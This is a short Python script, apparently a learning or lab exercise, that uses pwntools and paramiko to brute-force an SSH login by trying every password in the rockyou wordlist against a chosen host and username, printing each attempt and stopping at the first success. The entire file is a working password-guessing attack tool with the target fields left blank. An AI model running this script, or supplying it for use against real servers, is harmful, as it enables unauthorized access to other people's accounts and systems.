#pwn to interact with ssh servers and use paramiko module
#install pwntools if needed = {pip install pwntools}
from pwn import *
import paramiko

#add host = 'IP Address'
host = ''

#add username = 'Name'
username = ''
attempts = 0

#open file in read mode and open as 'pasword_list/ select list you desire to use 
with open('/usr/share/wordlists/rockyou.txt', 'r') as password_list:

    #create a loop for the words in ssh common password text 
    for password in password_list:

        #remove new line between word
        password = password.strip('\n')

        #Ignore error handling
        try:

            #output the amount of attempts and the password being used
            print('[{}] Attempting password: "{}"!'.format(attempts, password))

            #authentication attempt
            response = ssh(host = host, user = username, password = password, timeout = 1)
            
            #output successful attempt with password
            if response.connected():
                print('[>] Valid password found: "{}"!'.format(password))
                
                #close connection after verified password passes
                response.close()
                
                #stop the loop
                break
            
            #unvalid password close and rerty next word
            response.close()
        
        #know when the password is invalid
        except paramiko.ssh_exception.AuthenticationException:
            print('[X] Invalid Password!')
        
        #increase the number of attempts by 1
        attempts += 1